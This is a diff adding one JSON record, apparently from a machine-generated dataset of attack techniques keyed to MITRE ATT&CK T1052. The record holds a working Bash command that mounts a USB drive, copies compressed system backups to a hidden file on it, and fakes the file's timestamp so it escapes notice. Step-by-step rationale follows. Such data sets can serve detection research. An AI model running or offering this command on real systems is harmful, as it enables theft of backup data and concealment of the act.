@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && gzip -c /var/backups/*.bak > /mnt/usb/.bkp.gz && touch -r /bin/ls /mnt/usb/.bkp.gz && sync && umount /mnt/usb'",
+  "explanation": "Mounts a USB partition and streams gzip-compressed backup files to it, then aligns the file timestamp to blend with system files, operating solely on physical media.",
+  "rationale_steps": [
+    "Detect and mount the USB partition locally.",
+    "Use gzip to compress local backup files.",
+    "Copy the compressed data to the USB device.",
+    "Adjust timestamps to reduce attention and unmount.",
+    "No network resources are engaged."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-8a19f9cc",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
